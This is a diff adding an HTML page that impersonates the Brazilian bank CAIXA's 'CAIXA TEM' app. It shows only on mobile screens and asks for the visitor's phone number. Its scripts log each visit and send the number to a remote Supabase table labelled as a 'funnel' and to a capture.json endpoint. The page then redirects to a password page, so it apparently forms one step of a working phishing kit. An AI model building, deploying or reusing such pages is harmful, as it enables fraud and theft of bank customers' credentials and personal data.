@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <link rel="icon" type="image/png" href="favicon.png" />
+  <title>CAIXA TEM - Telefone</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: #0066b3;
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      overflow: hidden;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        display: flex;
+      }
+    }
+
+    .container {
+      background: white;
+      border-radius: 24px;
+      width: 100%;
+      max-width: 420px;
+      margin: auto;
+      padding: 0;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+      position: relative;
+      max-height: 100%;
+      overflow-y: auto;
+      align-self: center;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      font-size: 28px;
+      color: #666;
+      cursor: pointer;
+      font-weight: 300;
+      line-height: 1;
+      padding: 0;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .content {
+      padding: 80px 32px 32px 32px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .logo {
+      position: absolute;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo img {
+      max-width: 50px;
+      height: auto;
+    }
+
+    h1 {
+      color: #003e6b;
+      font-size: 30px;
+      font-weight: 600;
+      text-align: left;
+      line-height: 1.3;
+      margin-bottom: 32px;
+    }
+
+    label {
+      display: block;
+      color: #374151;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+
+    .input-wrapper {
+      margin-bottom: 24px;
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 16px 20px;
+      border: 1px solid #d1d5db;
+      border-radius: 12px;
+      font-size: 16px;
+      color: #374151;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input[type="tel"]::placeholder {
+      color: #9ca3af;
+    }
+
+    input[type="tel"]:focus {
+      border-color: #0066b3;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 16px;
+      background: #d4dfe6;
+      color: #a0adb5;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: not-allowed;
+      margin-bottom: 24px;
+    }
+
+    .whatsapp-link {
+      text-align: center;
+      margin-bottom: auto;
+    }
+
+    .whatsapp-link a {
+      color: #0066b3;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 500;
+      border-bottom: 1px solid #0066b3;
+      padding-bottom: 2px;
+    }
+
+    .whatsapp-link a:hover {
+      opacity: 0.8;
+    }
+
+    .version {
+      text-align: center;
+      color: #1a7f78;
+      font-size: 14px;
+      margin-top: auto;
+      padding-top: 40px;
+      padding-bottom: 20px;
+    }
+
+    @keyframes dotPulse {
+      0%, 20% { opacity: 0; }
+      50% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+
+    .loading-dots span {
+      animation: dotPulse 1.4s infinite;
+    }
+
+    .loading-dots span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .loading-dots span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <button class="close-btn">✕</button>
+    
+    <div class="content">
+      <div class="logo">
+        <img src="logocaixa2.png" alt="Logo">
+      </div>
+
+      <h1>Qual o número do<br>seu celular?</h1>
+
+      <div class="input-wrapper">
+        <label for="phoneInput">Celular</label>
+        <input type="tel" placeholder="(00) 00000-0000" maxlength="15" id="phoneInput">
+      </div>
+
+      <button class="submit-btn" id="submitBtn">Próximo</button>
+
+      <div class="whatsapp-link">
+        <a href="#">Não tenho WhatsApp</a>
+      </div>
+
+      <div class="version">Versão: 1.91.23</div>
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- SUPABASE INTEGRATION - MESMO SISTEMA DO FUNIL -->
+  <!-- ============================================ -->
+  <script>
+    const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable__7MjiigiJf7NgmLZPLFdxA_yRNF_cO8';
+
+    function getSessaoId() {
+      let id = sessionStorage.getItem('sessao_funil');
+      if (!id) {
+        id = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        sessionStorage.setItem('sessao_funil', id);
+      }
+      return id;
+    }
+
+    async function salvarEtapa(etapaNome, dadosColetados = {}) {
+      const sessao_id = getSessaoId();
+      
+      const payload = {
+        sessao_id: sessao_id,
+        etapa: etapaNome,
+        dados: dadosColetados,
+        url: window.location.pathname,
+        user_agent: navigator.userAgent.substring(0, 255)
+      };
+
+      console.log(`📝 Salvando etapa: ${etapaNome}`, dadosColetados);
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/funil_etapas`, {
+          method: 'POST',
+          headers: {
+            'apikey': SUPABASE_KEY,
+            'Authorization': `Bearer ${SUPABASE_KEY}`,
+            'Content-Type': 'application/json',
+            'Prefer': 'return=minimal'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          console.log(`✅ Etapa "${etapaNome}" salva com sucesso!`);
+          return true;
+        } else {
+          console.error(`❌ Erro ${response.status}:`, await response.text());
+          return false;
+        }
+      } catch (error) {
+        console.error('❌ Erro de rede:', error);
+        return false;
+      }
+    }
+  </script>
+
+  <script>
+    const phoneInput = document.getElementById('phoneInput');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA (ETAPA 5 DO FUNIL)
+    salvarEtapa('pagina_telefone', { 
+      pagina: 'telefone4e98',
+      timestamp_acesso: new Date().toISOString()
+    });
+
+    // Log visit (mantém compatibilidade)
+    fetch('capture.json', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ step: 'visit', page: 'telefone' })
+    }).catch(() => {});
+
+    phoneInput.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      
+      if (value.length > 11) {
+        value = value.slice(0, 11);
+      }
+      
+      if (value.length > 10) {
+        value = value.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+      } else if (value.length > 6) {
+        value = value.replace(/(\d{2})(\d{4})(\d{1,4})/, '($1) $2-$3');
+      } else if (value.length > 2) {
+        value = value.replace(/(\d{2})(\d{1,5})/, '($1) $2');
+      } else if (value.length > 0) {
+        value = value.replace(/(\d{1,2})/, '($1');
+      }
+      
+      e.target.value = value;
+
+      // Enable button when phone is complete
+      if (value.replace(/\D/g, '').length >= 10) {
+        submitBtn.style.background = '#d97706';
+        submitBtn.style.color = 'white';
+        submitBtn.style.cursor = 'pointer';
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.style.background = '#d4dfe6';
+        submitBtn.style.color = '#a0adb5';
+        submitBtn.style.cursor = 'not-allowed';
+        submitBtn.disabled = true;
+      }
+    });
+
+    submitBtn.addEventListener('click', async function() {
+      if (!this.disabled) {
+        const telefone = phoneInput.value;
+        const telefoneLimpo = telefone.replace(/\D/g, '');
+        
+        // SALVA O TELEFONE NO BANCO DE DADOS (ETAPA 5 DO FUNIL)
+        await salvarEtapa('telefone_informado', {
+          telefone: telefone,
+          telefone_limpo: telefoneLimpo,
+          ddd: telefoneLimpo.substring(0, 2),
+          numero: telefoneLimpo.substring(2),
+          timestamp: new Date().toISOString()
+        });
+        
+        // Salva também no storage para possível uso futuro
+        const phoneData = {
+          telefone: telefone,
+          telefone_limpo: telefoneLimpo,
+          ddd: telefoneLimpo.substring(0, 2),
+          numero: telefoneLimpo.substring(2),
+          timestamp: new Date().toISOString()
+        };
+        localStorage.setItem('funil_telefone_data', JSON.stringify(phoneData));
+        sessionStorage.setItem('funil_telefone_data', JSON.stringify(phoneData));
+        
+        console.log('💾 Telefone salvo no storage:', phoneData);
+        
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = 'Aguarde<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
+
+        // Mantém compatibilidade com capture.json
+        try {
+          fetch('capture.json', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ 
+                  step: 'phone', 
+                  phone: telefone
+              })
+          }).catch(() => {});
+        } catch(e) {}
+
+        // Aguarda 3 segundos e redireciona
+        setTimeout(() => {
+          window.location.href = 'senha4e98.html?a7k9m2x1p12';
+        }, 3000);
+      }
+    });
+  </script>
+
+  <script>
+    // Manter parâmetro de acesso em todos os links e formulários
+    document.addEventListener('DOMContentLoaded', function() {
+        var accessParam = 'a7k9m2x1p12';
+        
+        function addAccessToLinks() {
+            var links = document.querySelectorAll('a[href]');
+            links.forEach(function(link) {
+                var href = link.getAttribute('href');
+                if (!href || href.startsWith('http') || href.startsWith('#') || 
+                    href.startsWith('javascript:') || href.includes(accessParam.split('=')[0])) {
+                    return;
+                }
+                var separator = href.includes('?') ? '&' : '?';
+                link.setAttribute('href', href + separator + accessParam);
+            });
+        }
+        
+        function addAccessToForms() {
+            var forms = document.querySelectorAll('form');
+            forms.forEach(function(form) {
+                if (!form.method || form.method.toLowerCase() === 'get') {
+                    var paramName = accessParam.split('=')[0];
+                    var existingInput = form.querySelector('input[name="' + paramName + '"]');
+                    if (!existingInput) {
+                        var input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = paramName;
+                        input.value = '';
+                        form.appendChild(input);
+                    }
+                }
+            });
+        }
+        
+        addAccessToLinks();
+        addAccessToForms();
+        
+        var observer = new MutationObserver(function(mutations) {
+            var shouldUpdate = false;
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'childList') {
+                    mutation.addedNodes.forEach(function(node) {
+                        if (node.nodeType === 1) {
+                            if (node.tagName === 'A' || node.tagName === 'FORM' || 
+                                node.querySelector('a') || node.querySelector('form')) {
+                                shouldUpdate = true;
+                            }
+                        }
+                    });
+                }
+            });
+            if (shouldUpdate) {
+                addAccessToLinks();
+                addAccessToForms();
+            }
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
+  </script>
+</body>
+</html>
